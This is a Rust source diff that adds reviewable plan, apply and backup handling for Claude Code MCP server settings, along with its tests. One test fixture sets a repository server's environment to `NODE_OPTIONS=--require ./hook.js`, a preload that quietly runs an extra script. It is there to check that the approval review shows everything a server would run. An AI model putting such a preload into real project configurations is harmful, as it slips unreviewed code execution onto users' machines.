@@ -5,12 +5,14 @@ use crate::cli::locate;
 use crate::cli::parse;
 use crate::cli::runner::{self, RunOutput, RunSpec};
 use crate::config::ConfigPaths;
+use crate::config::docstore::{Docstore, Plan};
 use crate::config::fsx;
 use crate::config::inventory;
 use crate::diagnose::report;
 use crate::model::ServerName;
+use crate::ops;
 use crate::sanitize::{clip, sanitize};
-use std::collections::VecDeque;
+use std::collections::{HashMap, VecDeque};
 use std::ffi::{OsStr, OsString};
 use std::io;
 use std::path::{Path, PathBuf};
@@ -30,6 +32,48 @@ pub enum Command {
     /// Check one server again with the client's own debug output and explain what went wrong. Like `Check`,
     /// this runs a project server's command, so it only happens on request.
     Diagnose(ServerId),
+    /// Work out what the changes would do to the configuration, and show it. Writes nothing.
+    Prepare(Vec<Change>),
+    /// Write a plan shown by [`Event::PlanReady`]. A plan can be applied once.
+    Apply(u64),
+    /// The user declined a plan.
+    Discard(u64),
+}
+
+/// Something the user wants changed. Targets are rows of the current inventory; project scope cannot be
+/// created, only toggled.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub enum Change {
+    /// Turn a server on or off (`/mcp disable`). For a user server this covers every project Claude knows.
+    SetEnabled { id: ServerId, enabled: bool },
+    /// Let Claude Code run a project (`.mcp.json`) server: the one thing written inside a repository. The plan
+    /// shows everything the server would run first.
+    Approve { id: ServerId },
+}
+
+/// What a plan would change in one file. Lines starting with `+ ` are additions, `- ` removals, two spaces a
+/// heading. Sanitised, and never carries server settings.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct FileDiff {
+    pub path: String,
+    pub lines: Vec<String>,
+}
+
+/// What a change lets Claude Code run, shown in full before the user agrees. Sanitised; nothing is shortened.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct Review {
+    pub title: String,
+    pub lines: Vec<String>,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct PlanView {
+    pub id: u64,
+    pub files: Vec<FileDiff>,
+    pub reviews: Vec<Review>,
+    pub warnings: Vec<String>,
+    /// The configuration already looks like this; applying would write nothing.
+    pub nothing_to_do: bool,
 }
 
 /// One plain-language explanation of a common failure.
@@ -67,6 +111,26 @@ pub enum Event {
     Diagnosis {
         id: ServerId,
         diagnosis: Diagnosis,
+    },
+    PlanReady(PlanView),
+    /// The changes could not be turned into a plan (nothing was written).
+    PlanFailed(String),
+    /// The plan was written. `backup` is where the previous contents were saved.
+    Applied {
+        plan: u64,
+        /// Anything was written. `false` when the files already looked like this.
+        changed: bool,
+        /// Where the previous contents were saved (several places are joined), when there were any.
+        backup: Option<String>,
+    },
+    /// Nothing was written, or the change could not be kept.
+    ApplyFailed {
+        plan: u64,
+        error: String,
+    },
+    /// Claude Code overwrote the change right after it was written, and it was put back.
+    Reapplied {
+        plan: u64,
     },
 }
 
@@ -110,6 +174,10 @@ pub(crate) struct EngineConfig {
     /// A user-configured path to the Claude CLI.
     pub claude: Option<PathBuf>,
     pub home: Option<PathBuf>,
+    /// Private folder for backups of `.claude.json` before it is changed. Without it nothing is written.
+    pub backup_dir: Option<PathBuf>,
+    /// How long after a write to look again for an unlocked overwrite by Claude Code.
+    pub verify_delay: Duration,
     pub path_var: Option<OsString>,
     /// Extra environment for the CLI. Used by tests to point `fake-claude` at a scenario.
     pub cli_env: Vec<(String, OsString)>,
@@ -179,7 +247,29 @@ struct Shared {
     wake_workers: Condvar,
     generation: AtomicU64,
     claude: RwLock<Option<PathBuf>>,
+    /// The CLI's version, for the program file it was read from. Asking costs a process start (Claude Code is a
+    /// large Node program), so it is only asked again when the file changes.
+    version: Mutex<Option<(ProgramStamp, Option<String>)>>,
     emitter: Emitter,
+}
+
+/// Identifies one build of the CLI on disk: its path, size and modification time.
+#[derive(Clone, PartialEq, Eq)]
+struct ProgramStamp {
+    path: PathBuf,
+    len: u64,
+    modified: Option<std::time::SystemTime>,
+}
+
+impl ProgramStamp {
+    fn of(path: &Path) -> Option<Self> {
+        let meta = std::fs::metadata(path).ok()?;
+        Some(Self {
+            path: path.to_owned(),
+            len: meta.len(),
+            modified: meta.modified().ok(),
+        })
+    }
 }
 
 fn engine_main(config: EngineConfig, commands: Receiver<Command>, emitter: Emitter) {
@@ -190,6 +280,7 @@ fn engine_main(config: EngineConfig, commands: Receiver<Command>, emitter: Emitt
         wake_workers: Condvar::new(),
         generation: AtomicU64::new(0),
         claude: RwLock::new(None),
+        version: Mutex::new(None),
         emitter,
     });
     for _ in 0..workers {
@@ -198,9 +289,15 @@ fn engine_main(config: EngineConfig, commands: Receiver<Command>, emitter: Emitt
     }
 
     let mut snapshot = Arc::new(Snapshot::default());
+    let mut plans = Plans::default();
     refresh(&shared, &mut snapshot, false);
     while let Ok(command) = commands.recv() {
         match command {
+            Command::Prepare(changes) => prepare(&shared, &mut plans, &changes),
+            Command::Apply(id) => apply(&shared, &mut plans, &mut snapshot, id),
+            Command::Discard(id) => {
+                plans.stored.remove(&id);
+            }
             Command::Refresh { live_all } => refresh(&shared, &mut snapshot, live_all),
             Command::Check(id) => enqueue_now(&shared, &snapshot, &id, JobKind::Check),
             Command::Diagnose(id) => enqueue_now(&shared, &snapshot, &id, JobKind::Diagnose),
@@ -209,6 +306,176 @@ fn engine_main(config: EngineConfig, commands: Receiver<Command>, emitter: Emitt
     // The UI is gone: let the workers finish what they are doing and stop.
     lock(&shared.queue).shutdown = true;
     shared.wake_workers.notify_all();
+}
+
+/// A prepared change: one plan per file, written settings files first and `.claude.json` last.
+struct Stored {
+    parts: Vec<(Plan, Docstore)>,
+    guards: Vec<ops::Guard>,
+}
+
+#[derive(Default)]
+struct Plans {
+    next: u64,
+    stored: HashMap<u64, Stored>,
+}
+
+fn backup_dir(shared: &Shared) -> Result<PathBuf, String> {
+    shared.config.backup_dir.clone().ok_or_else(|| {
+        "There is no private folder for backups, so nothing will be changed.".to_owned()
+    })
+}
+
+fn prepare(shared: &Shared, plans: &mut Plans, changes: &[Change]) {
+    let made = (|| {
+        let paths = shared.config.paths.as_ref().ok_or_else(|| {
+            "Could not determine where Claude Code keeps its configuration.".to_owned()
+        })?;
+        // Always against the files as they are now, not the snapshot the user last saw. `.claude.json` is read once
+        // for both the inventory and the plan.
+        let read = fsx::read_limited_bom(&paths.claude_json, inventory::MAX_CLAUDE_JSON);
+        let fresh = inventory::load_text(
+            paths,
+            match &read {
+                Ok(text) => Ok(text.as_ref().map(|(t, _)| t.as_str())),
+                Err(e) => Err(e.to_string()),
+            },
+        );
+        let resolved = ops::resolve(changes, &fresh)?;
+        let mut parts = Vec::new();
+        for (project, ops) in resolved.settings {
+            let file = Path::new(&project)
+                .join(".claude")
+                .join("settings.local.json");
+            let store = Docstore::project_settings(file, backup_dir(shared)?);
+            let plan = store.prepare(ops).map_err(|e| e.to_string())?;
+            parts.push((plan, store));
+        }
+        if !resolved.claude.is_empty() {
+            let mut store = Docstore::new(paths.claude_json.clone(), backup_dir(shared)?);
+            store.verify_delay = shared.config.verify_delay;
+            let plan = match read {
+                Ok(Some((text, bom))) => store.prepare_text(text, bom, resolved.claude),
+                _ => store.prepare(resolved.claude),
+            }
+            .map_err(|e| e.to_string())?;
+            parts.push((plan, store));
+        }
+        for (_, store) in &mut parts {
+            store.verify_delay = shared.config.verify_delay;
+        }
+        Ok::<_, String>((parts, resolved.guards, resolved.warnings, resolved.reviews))
+    })();
+    match made {
+        Ok((parts, guards, warnings, reviews)) => {
+            plans.next += 1;
+            let id = plans.next;
+            let nothing_to_do = parts.iter().all(|(plan, _)| plan.is_empty());
+            let view = PlanView {
+                id,
+                files: parts
+                    .iter()
+                    .flat_map(|(plan, _)| plan.changes())
+                    .filter(|c| !c.lines.is_empty())
+                    .map(|c| FileDiff {
+                        path: c.path.clone(),
+                        lines: c.lines.clone(),
+                    })
+                    .collect(),
+                // Nothing to approve when nothing would be written.
+                reviews: if nothing_to_do { Vec::new() } else { reviews },
+                warnings,
+                nothing_to_do,
+            };
+            plans.stored.insert(id, Stored { parts, guards });
+            shared.emitter.emit(Event::PlanReady(view));
+        }
+        Err(e) => shared.emitter.emit(Event::PlanFailed(sanitize(&e))),
+    }
+}
+
+fn apply(shared: &Shared, plans: &mut Plans, snapshot: &mut Arc<Snapshot>, id: u64) {
+    let fail = |error: String| {
+        shared.emitter.emit(Event::ApplyFailed { plan: id, error });
+    };
+    let Some(Stored { parts, guards }) = plans.stored.remove(&id) else {
+        return fail("This change was already applied or discarded. Prepare it again.".to_owned());
+    };
+    // What the user reviewed must still be what is there.
+    if let Some(changed) = guards.iter().find(|g| !g.still_holds()) {
+        return fail(format!(
+            "{} changed in {} after you looked at it. Nothing was saved; review it again.",
+            sanitize(&changed.name),
+            sanitize(&changed.project)
+        ));
+    }
+    let mut written = Vec::new();
+    let mut backups = Vec::new();
+    for (plan, store) in &parts {
+        match store.apply(plan) {
+            Ok(applied) => {
+                if applied.wrote {
+                    written.push((plan.clone(), store.clone()));
+                }
+                backups.extend(applied.backup);
+            }
+            Err(e) => {
+                let mut message = e.to_string();
+                if !written.is_empty() {
+                    let done: Vec<String> = written
+                        .iter()
+                        .flat_map(|(p, _)| p.changes().iter().map(|c| c.path.clone()))
+                        .collect();
+                    message.push_str(&format!(
+                        " Already saved: {}. The rest was not changed.",
+                        done.join(", ")
+                    ));
+                    reload_after_change(shared, snapshot);
+                }
+                return fail(message);
+            }
+        }
+    }
+    let changed = !written.is_empty();
+    if changed {
+        reload_after_change(shared, snapshot);
+        // Claude Code can write without our lock; look again shortly, off the engine thread.
+        let emitter = shared.emitter.clone();
+        let paths = shared.config.paths.clone();
+        std::thread::spawn(move || {
+            let mut reapplied = false;
+            for (plan, store) in &written {
+                match store.verify(plan) {
+                    Ok(again) => reapplied |= again,
+                    Err(e) => {
+                        return emitter.emit(Event::ApplyFailed {
+                            plan: id,
+                            error: e.to_string(),
+                        });
+                    }
+                }
+            }
+            if reapplied {
+                if let Some(paths) = paths {
+                    emitter.emit(Event::Snapshot(Arc::new(inventory::load(&paths))));
+                }
+                emitter.emit(Event::Reapplied { plan: id });
+            }
+        });
+    }
+    shared.emitter.emit(Event::Applied {
+        plan: id,
+        changed,
+        backup: (!backups.is_empty()).then(|| {
+            sanitize(
+                &backups
+                    .iter()
+                    .map(|b| b.display().to_string())
+                    .collect::<Vec<_>>()
+                    .join(", "),
+            )
+        }),
+    });
 }
 
 fn lock<T>(m: &Mutex<T>) -> MutexGuard<'_, T> {
@@ -248,7 +515,7 @@ fn refresh(shared: &Shared, snapshot: &mut Arc<Snapshot>, live_all: bool) {
     *shared.claude.write().unwrap_or_else(|e| e.into_inner()) = Some(program.clone());
     shared
         .emitter
-        .emit(Event::CliVersion(cli_version(shared, &program)));
+        .emit(Event::CliVersion(cached_cli_version(shared, &program)));
 
     let mut jobs = Vec::new();
     for row in &snapshot.servers {
@@ -274,9 +541,44 @@ fn refresh(shared: &Shared, snapshot: &mut Arc<Snapshot>, live_all: bool) {
     shared.wake_workers.notify_all();
 }
 
+/// After klefki itself changed the configuration: show the new state, and check only servers the change switched
+/// on. A full refresh would look for the CLI again, ask its version, drop the checks still running and start them
+/// over, each one a process start that the change did not call for.
+fn reload_after_change(shared: &Shared, snapshot: &mut Arc<Snapshot>) {
+    let Some(paths) = &shared.config.paths else {
+        return;
+    };
+    let before = std::mem::replace(snapshot, Arc::new(inventory::load(paths)));
+    shared.emitter.emit(Event::Snapshot(Arc::clone(snapshot)));
+    let generation = shared.generation.load(Ordering::SeqCst);
+    let jobs: Vec<Job> = snapshot
+        .servers
+        .iter()
+        .filter(|row| {
+            row.scope != Scope::Project
+                && row.enabled
+                && row.status == Status::Unknown
+                && !before
+                    .servers
+                    .iter()
+                    .any(|old| old.enabled && same_row(old, row))
+        })
+        .filter_map(|row| build_job(shared, row, generation, JobKind::Check, true))
+        .collect();
+    if !jobs.is_empty() {
+        lock(&shared.queue).jobs.extend(jobs);
+        shared.wake_workers.notify_all();
+    }
+}
+
+/// The same server in two snapshots, compared without building ids.
+fn same_row(a: &ServerRow, b: &ServerRow) -> bool {
+    a.scope == b.scope && a.name == b.name && a.project == b.project
+}
+
 /// A check or diagnosis the user asked for: ahead of the background checks.
 fn enqueue_now(shared: &Shared, snapshot: &Snapshot, id: &ServerId, kind: JobKind) {
-    let Some(row) = snapshot.servers.iter().find(|r| r.id() == *id) else {
+    let Some(row) = snapshot.servers.iter().find(|r| r.is(id)) else {
         return;
     };
     let generation = shared.generation.load(Ordering::SeqCst);
@@ -405,6 +707,20 @@ fn cli_env(shared: &Shared) -> Vec<(&str, &OsStr)> {
         .iter()
         .map(|(k, v)| (k.as_str(), v.as_os_str()))
         .collect()
+}
+
+fn cached_cli_version(shared: &Shared, program: &Path) -> Option<String> {
+    let stamp = ProgramStamp::of(program);
+    if let (Some(stamp), Some((known, version))) = (&stamp, &*lock(&shared.version))
+        && stamp == known
+    {
+        return version.clone();
+    }
+    let version = cli_version(shared, program);
+    if let Some(stamp) = stamp {
+        *lock(&shared.version) = Some((stamp, version.clone()));
+    }
+    version
 }
 
 fn cli_version(shared: &Shared, program: &Path) -> Option<String> {
@@ -623,6 +939,8 @@ mod tests {
                     ),
                     ("FAKE_CLAUDE_LOG".into(), self.log.clone().into()),
                 ],
+                backup_dir: Some(self.dir.path().join("backups")),
+                verify_delay: Duration::from_millis(50),
                 max_checks: 3,
                 check_timeout: Duration::from_secs(10),
             }
@@ -637,7 +955,9 @@ mod tests {
             let lines: Vec<serde_json::Value> = std::fs::read_to_string(&self.log)
                 .unwrap_or_default()
                 .lines()
-                .map(|l| serde_json::from_str(l).unwrap())
+                .map(|l| {
+                    serde_json::from_str(l).unwrap_or_else(|e| panic!("bad log line {l:?}: {e}"))
+                })
                 .collect();
             let mut out = Vec::new();
             for start in lines.iter().filter(|l| l["event"] == "start") {
@@ -1204,5 +1524,864 @@ mod tests {
         core.send(Command::Diagnose(id));
         let events = collect(&core, |e| diagnosis_of(e, "bad-stdio").is_some());
         assert_eq!(final_status(&events, "bad-stdio"), Some(Status::Failed));
+    }
+
+    // ---- changing the configuration
+
+    fn config_json(env: &Env) -> serde_json::Value {
+        let text =
+            std::fs::read_to_string(env.dir.path().join("cfg").join(".claude.json")).unwrap();
+        serde_json::from_str(&text).unwrap()
+    }
+
+    fn write_config(env: &Env, value: &serde_json::Value) {
+        std::fs::write(
+            env.dir.path().join("cfg").join(".claude.json"),
+            serde_json::to_string_pretty(value).unwrap(),
+        )
+        .unwrap();
+    }
+
+    /// Two projects, a user server with a secret, and a local server in one of them.
+    fn two_projects(env_dir_hint: &str) -> serde_json::Value {
+        serde_json::json!({
+            "numStartups": 3,
+            "mcpServers": {"gw": {"type": "stdio", "command": "node", "env": {"TOKEN": "s3cret-value"}}},
+            "projects": {
+                "/work/a": {"mcpServers": {"loc": {"type": "stdio", "command": "x"}}, "disabledMcpServers": []},
+                "/work/b": {"disabledMcpServers": ["other"]}
+            },
+            "tail": env_dir_hint
+        })
+    }
+
+    fn quiet_env(claude_json: &serde_json::Value) -> Env {
+        Env::new(claude_json, r#"{"rules":[]}"#, &[])
+    }
+
+    fn user_id(name: &str) -> ServerId {
+        ServerId {
+            scope: Scope::User,
+            project: None,
+            name: name.to_owned(),
+        }
+    }
+
+    fn local_id(name: &str, project: &str) -> ServerId {
+        ServerId {
+            scope: Scope::Local,
+            project: Some(project.to_owned()),
+            name: name.to_owned(),
+        }
+    }
+
+    fn plan_for(core: &Core, changes: Vec<Change>) -> PlanView {
+        core.send(Command::Prepare(changes));
+        let events = collect(core, |e| {
+            e.iter()
+                .any(|x| matches!(x, Event::PlanReady(_) | Event::PlanFailed(_)))
+        });
+        events
+            .into_iter()
+            .find_map(|e| match e {
+                Event::PlanReady(p) => Some(p),
+                _ => None,
+            })
+            .expect("a plan")
+    }
+
+    fn disabled_list(env: &Env, project: &str) -> serde_json::Value {
+        config_json(env)["projects"][project]["disabledMcpServers"].clone()
+    }
+
+    #[test]
+    fn switching_a_user_server_off_covers_every_known_project() {
+        let env = quiet_env(&two_projects("end"));
+        let core = env.start();
+        let plan = plan_for(
+            &core,
+            vec![Change::SetEnabled {
+                id: user_id("gw"),
+                enabled: false,
+            }],
+        );
+        assert!(!plan.nothing_to_do);
+        assert!(
+            plan.warnings.iter().any(|w| w.contains("2 projects")),
+            "{:?}",
+            plan.warnings
+        );
+        core.send(Command::Apply(plan.id));
+        let events = collect(&core, |e| {
+            e.iter().any(|x| matches!(x, Event::Applied { .. }))
+                && e.iter().any(|x| {
+                    matches!(x, Event::Snapshot(s)
+                        if s.servers.iter().any(|r| r.name == "gw" && !r.enabled))
+                })
+        });
+        assert!(events.iter().any(|e| matches!(
+            e,
+            Event::Applied {
+                backup: Some(_),
+                ..
+            }
+        )));
+        assert_eq!(disabled_list(&env, "/work/a"), serde_json::json!(["gw"]));
+        assert_eq!(
+            disabled_list(&env, "/work/b"),
+            serde_json::json!(["other", "gw"])
+        );
+        // Everything else is as it was, in the same order.
+        let now = config_json(&env);
+        let keys: Vec<_> = now.as_object().unwrap().keys().cloned().collect();
+        assert_eq!(keys, ["numStartups", "mcpServers", "projects", "tail"]);
+        assert_eq!(now["mcpServers"], two_projects("end")["mcpServers"]);
+    }
+
+    #[test]
+    fn switching_a_user_server_back_on_removes_it_everywhere() {
+        let mut start = two_projects("end");
+        start["projects"]["/work/a"]["disabledMcpServers"] = serde_json::json!(["gw"]);
+        start["projects"]["/work/b"]["disabledMcpServers"] = serde_json::json!(["gw", "other"]);
+        let env = quiet_env(&start);
+        let core = env.start();
+        let plan = plan_for(
+            &core,
+            vec![Change::SetEnabled {
+                id: user_id("gw"),
+                enabled: true,
+            }],
+        );
+        core.send(Command::Apply(plan.id));
+        collect(&core, |e| {
+            e.iter().any(|x| matches!(x, Event::Applied { .. }))
+        });
+        assert_eq!(disabled_list(&env, "/work/a"), serde_json::json!([]));
+        assert_eq!(disabled_list(&env, "/work/b"), serde_json::json!(["other"]));
+    }
+
+    #[test]
+    fn a_local_server_is_switched_in_its_own_project_only() {
+        let env = quiet_env(&two_projects("end"));
+        let core = env.start();
+        let plan = plan_for(
+            &core,
+            vec![Change::SetEnabled {
+                id: local_id("loc", "/work/a"),
+                enabled: false,
+            }],
+        );
+        core.send(Command::Apply(plan.id));
+        collect(&core, |e| {
+            e.iter().any(|x| matches!(x, Event::Applied { .. }))
+        });
+        assert_eq!(disabled_list(&env, "/work/a"), serde_json::json!(["loc"]));
+        assert_eq!(disabled_list(&env, "/work/b"), serde_json::json!(["other"]));
+    }
+
+    #[test]
+    fn several_changes_make_one_plan_and_one_backup() {
+        let env = quiet_env(&two_projects("end"));
+        let core = env.start();
+        let plan = plan_for(
+            &core,
+            vec![
+                Change::SetEnabled {
+                    id: local_id("loc", "/work/a"),
+                    enabled: false,
+                },
+                Change::SetEnabled {
+                    id: user_id("gw"),
+                    enabled: false,
+                },
+            ],
+        );
+        core.send(Command::Apply(plan.id));
+        collect(&core, |e| {
+            e.iter().any(|x| matches!(x, Event::Applied { .. }))
+        });
+        assert_eq!(
+            disabled_list(&env, "/work/a"),
+            serde_json::json!(["loc", "gw"])
+        );
+        assert_eq!(
+            std::fs::read_dir(env.dir.path().join("backups"))
+                .unwrap()
+                .count(),
+            1
+        );
+    }
+
+    #[test]
+    fn the_plan_never_shows_server_settings() {
+        let env = quiet_env(&two_projects("end"));
+        let core = env.start();
+        let plan = plan_for(
+            &core,
+            vec![Change::SetEnabled {
+                id: user_id("gw"),
+                enabled: false,
+            }],
+        );
+        let shown = format!("{plan:?}");
+        assert!(shown.contains("gw") && !shown.contains("s3cret"), "{shown}");
+    }
+
+    #[test]
+    fn a_plan_can_be_applied_once_and_not_after_it_is_discarded() {
+        let env = quiet_env(&two_projects("end"));
+        let core = env.start();
+        let change = Change::SetEnabled {
+            id: local_id("loc", "/work/a"),
+            enabled: false,
+        };
+        let first = plan_for(&core, vec![change.clone()]);
+        core.send(Command::Apply(first.id));
+        core.send(Command::Apply(first.id));
+        let events = collect(&core, |e| {
+            e.iter().any(|x| matches!(x, Event::Applied { .. }))
+                && e.iter().any(|x| matches!(x, Event::ApplyFailed { .. }))
+        });
+        assert!(
+            events
+                .iter()
+                .any(|e| matches!(e, Event::ApplyFailed { plan, .. } if *plan == first.id))
+        );
+        assert_eq!(disabled_list(&env, "/work/a"), serde_json::json!(["loc"]));
+
+        let second = plan_for(
+            &core,
+            vec![Change::SetEnabled {
+                id: local_id("loc", "/work/a"),
+                enabled: true,
+            }],
+        );
+        core.send(Command::Discard(second.id));
+        core.send(Command::Apply(second.id));
+        collect(&core, |e| {
+            e.iter()
+                .any(|x| matches!(x, Event::ApplyFailed { plan, .. } if *plan == second.id))
+        });
+        assert_eq!(disabled_list(&env, "/work/a"), serde_json::json!(["loc"]));
+    }
+
+    #[test]
+    fn a_server_that_is_gone_makes_no_plan() {
+        let env = quiet_env(&two_projects("end"));
+        let core = env.start();
+        core.send(Command::Prepare(vec![Change::SetEnabled {
+            id: user_id("ghost"),
+            enabled: false,
+        }]));
+        let events = collect(&core, |e| {
+            e.iter().any(|x| matches!(x, Event::PlanFailed(_)))
+        });
+        assert!(
+            events
+                .iter()
+                .any(|e| matches!(e, Event::PlanFailed(m) if m.contains("ghost")))
+        );
+        assert!(!events.iter().any(|e| matches!(e, Event::PlanReady(_))));
+    }
+
+    #[test]
+    fn a_change_that_is_already_true_is_reported_as_nothing_to_do() {
+        let env = quiet_env(&two_projects("end"));
+        let core = env.start();
+        let plan = plan_for(
+            &core,
+            vec![Change::SetEnabled {
+                id: local_id("loc", "/work/a"),
+                enabled: true,
+            }],
+        );
+        assert!(plan.nothing_to_do);
+        core.send(Command::Apply(plan.id));
+        let events = collect(&core, |e| {
+            e.iter().any(|x| matches!(x, Event::Applied { .. }))
+        });
+        assert!(events.iter().any(|e| matches!(
+            e,
+            Event::Applied {
+                changed: false,
+                backup: None,
+                ..
+            }
+        )));
+        assert!(!env.dir.path().join("backups").exists());
+    }
+
+    #[test]
+    fn a_user_server_cannot_be_switched_when_no_project_is_known() {
+        let env = quiet_env(
+            &serde_json::json!({"mcpServers": {"gw": {"type": "stdio", "command": "x"}}}),
+        );
+        let core = env.start();
+        core.send(Command::Prepare(vec![Change::SetEnabled {
+            id: user_id("gw"),
+            enabled: false,
+        }]));
+        collect(&core, |e| {
+            e.iter().any(|x| matches!(x, Event::PlanFailed(_)))
+        });
+    }
+
+    #[test]
+    fn toggling_a_project_server_writes_only_the_user_file_and_does_not_approve_it() {
+        let env = quiet_env(&serde_json::json!({}));
+        let repo = env.dir.path().join("repo");
+        std::fs::create_dir_all(&repo).unwrap();
+        std::fs::write(
+            repo.join(".mcp.json"),
+            r#"{"mcpServers":{"ps":{"type":"stdio","command":"danger"}}}"#,
+        )
+        .unwrap();
+        let key = repo.to_string_lossy().replace('\\', "/");
+        write_config(&env, &serde_json::json!({"projects": {key.clone(): {}}}));
+        let core = env.start();
+        let id = ServerId {
+            scope: Scope::Project,
+            project: Some(inventory::normalise_project(&key)),
+            name: "ps".to_owned(),
+        };
+        let plan = plan_for(
+            &core,
+            vec![Change::SetEnabled {
+                id: id.clone(),
+                enabled: true,
+            }],
+        );
+        assert!(
+            plan.warnings.iter().any(|w| w.contains("not approved")),
+            "{:?}",
+            plan.warnings
+        );
+        let plan = plan_for(&core, vec![Change::SetEnabled { id, enabled: false }]);
+        core.send(Command::Apply(plan.id));
+        collect(&core, |e| {
+            e.iter().any(|x| matches!(x, Event::Applied { .. }))
+        });
+        assert_eq!(
+            config_json(&env)["projects"][&key]["disabledMcpServers"],
+            serde_json::json!(["ps"])
+        );
+        // The repository was not touched: no approval file, same .mcp.json.
+        assert!(!repo.join(".claude").exists());
+        assert_eq!(
+            std::fs::read_to_string(repo.join(".mcp.json")).unwrap(),
+            r#"{"mcpServers":{"ps":{"type":"stdio","command":"danger"}}}"#
+        );
+    }
+
+    #[test]
+    fn a_lock_held_by_claude_stops_the_write_with_a_clear_message() {
+        let env = quiet_env(&two_projects("end"));
+        let core = env.start();
+        let plan = plan_for(
+            &core,
+            vec![Change::SetEnabled {
+                id: local_id("loc", "/work/a"),
+                enabled: false,
+            }],
+        );
+        let before =
+            std::fs::read_to_string(env.dir.path().join("cfg").join(".claude.json")).unwrap();
+        std::fs::create_dir(env.dir.path().join("cfg").join(".claude.json.lock")).unwrap();
+        core.send(Command::Apply(plan.id));
+        let events = collect(&core, |e| {
+            e.iter().any(|x| matches!(x, Event::ApplyFailed { .. }))
+        });
+        let error = events
+            .iter()
+            .find_map(|e| match e {
+                Event::ApplyFailed { error, .. } => Some(error.clone()),
+                _ => None,
+            })
+            .unwrap();
+        assert!(error.contains("writing its configuration"), "{error}");
+        assert_eq!(
+            std::fs::read_to_string(env.dir.path().join("cfg").join(".claude.json")).unwrap(),
+            before
+        );
+    }
+
+    #[test]
+    fn a_change_claude_overwrites_a_moment_later_is_put_back() {
+        let env = quiet_env(&two_projects("end"));
+        let mut config = env.config();
+        config.verify_delay = Duration::from_millis(800);
+        let core = start_with(config, || {});
+        let plan = plan_for(
+            &core,
+            vec![Change::SetEnabled {
+                id: local_id("loc", "/work/a"),
+                enabled: false,
+            }],
+        );
+        core.send(Command::Apply(plan.id));
+        collect(&core, |e| {
+            e.iter().any(|x| matches!(x, Event::Applied { .. }))
+        });
+        // Claude saves an older copy without taking the lock, with a newer counter of its own.
+        let mut theirs = two_projects("end");
+        theirs["numStartups"] = serde_json::json!(4);
+        write_config(&env, &theirs);
+        let events = collect(&core, |e| {
+            e.iter().any(|x| matches!(x, Event::Reapplied { .. }))
+        });
+        assert!(
+            events
+                .iter()
+                .any(|e| matches!(e, Event::Reapplied { plan: p } if *p == plan.id))
+        );
+        let now = config_json(&env);
+        assert_eq!(now["numStartups"], 4);
+        assert_eq!(
+            now["projects"]["/work/a"]["disabledMcpServers"],
+            serde_json::json!(["loc"])
+        );
+    }
+
+    // ---- approving a project server
+
+    const MCP_JSON: &str = r#"{"mcpServers":{"ps":{"type":"stdio","command":"node","args":["server.js","--port","9"],"env":{"NODE_OPTIONS":"--require ./hook.js"}}}}"#;
+
+    /// A repository with a `.mcp.json`, known to Claude as a project. Returns the environment, the project key as
+    /// the inventory spells it, and the repository path.
+    fn repo_env(claude_entry: serde_json::Value) -> (Env, String, PathBuf) {
+        let env = quiet_env(&serde_json::json!({}));
+        let repo = env.dir.path().join("repo");
+        std::fs::create_dir_all(&repo).unwrap();
+        std::fs::write(repo.join(".mcp.json"), MCP_JSON).unwrap();
+        let key = repo.to_string_lossy().replace('\\', "/");
+        write_config(
+            &env,
+            &serde_json::json!({"numStartups": 1, "projects": {key.clone(): claude_entry}}),
+        );
+        let key = inventory::normalise_project(&key);
+        (env, key, repo)
+    }
+
+    fn project_id(key: &str, name: &str) -> ServerId {
+        ServerId {
+            scope: Scope::Project,
+            project: Some(key.to_owned()),
+            name: name.to_owned(),
+        }
+    }
+
+    fn approve(key: &str) -> Vec<Change> {
+        vec![Change::Approve {
+            id: project_id(key, "ps"),
+        }]
+    }
+
+    fn settings_of(repo: &Path) -> Option<serde_json::Value> {
+        std::fs::read_to_string(repo.join(".claude").join("settings.local.json"))
+            .ok()
+            .map(|t| serde_json::from_str(&t).unwrap())
+    }
+
+    fn apply_and_wait(core: &Core, plan: &PlanView) -> Vec<Event> {
+        core.send(Command::Apply(plan.id));
+        collect(core, |e| {
+            e.iter()
+                .any(|x| matches!(x, Event::Applied { .. } | Event::ApplyFailed { .. }))
+        })
+    }
+
+    #[test]
+    fn the_plan_shows_everything_the_server_would_run_and_writes_nothing_yet() {
+        let (env, key, repo) = repo_env(serde_json::json!({}));
+        let core = env.start();
+        let plan = plan_for(&core, approve(&key));
+        assert_eq!(plan.reviews.len(), 1);
+        assert_eq!(
+            plan.reviews[0].lines,
+            [
+                "Command: node",
+                "Argument 1: server.js",
+                "Argument 2: --port",
+                "Argument 3: 9",
+                "Environment: NODE_OPTIONS=--require ./hook.js",
+            ]
+        );
+        assert!(plan.reviews[0].title.contains("ps"));
+        assert!(
+            plan.warnings
+                .iter()
+                .any(|w| w.contains("trust the repository")),
+            "{:?}",
+            plan.warnings
+        );
+        assert!(
+            plan.warnings.iter().any(|w| w.contains(".gitignore")),
+            "{:?}",
+            plan.warnings
+        );
+        assert_eq!(plan.files.len(), 1);
+        assert!(plan.files[0].path.ends_with("settings.local.json"));
+        assert_eq!(plan.files[0].lines, ["  enabledMcpjsonServers", "+ ps"]);
+        assert!(!repo.join(".claude").exists(), "preparing writes nothing");
+    }
+
+    #[test]
+    fn approving_writes_only_the_settings_file_in_the_repository() {
+        let (env, key, repo) = repo_env(serde_json::json!({}));
+        let claude_json_before =
+            std::fs::read_to_string(env.dir.path().join("cfg").join(".claude.json")).unwrap();
+        let core = env.start();
+        let plan = plan_for(&core, approve(&key));
+        let events = apply_and_wait(&core, &plan);
+        assert!(
+            events.iter().any(|e| matches!(
+                e,
+                Event::Applied {
+                    changed: true,
+                    backup: None,
+                    ..
+                }
+            )),
+            "{events:#?}"
+        );
+        assert_eq!(
+            settings_of(&repo),
+            Some(serde_json::json!({"enabledMcpjsonServers": ["ps"]}))
+        );
+        // Nothing else in the repository, and no lock left behind.
+        let mut top: Vec<_> = std::fs::read_dir(&repo)
+            .unwrap()
+            .map(|e| e.unwrap().file_name().to_string_lossy().into_owned())
+            .collect();
+        top.sort();
+        assert_eq!(top, [".claude", ".mcp.json"]);
+        let inner: Vec<_> = std::fs::read_dir(repo.join(".claude"))
+            .unwrap()
+            .map(|e| e.unwrap().file_name().to_string_lossy().into_owned())
+            .collect();
+        assert_eq!(inner, ["settings.local.json"]);
+        assert_eq!(
+            std::fs::read_to_string(repo.join(".mcp.json")).unwrap(),
+            MCP_JSON
+        );
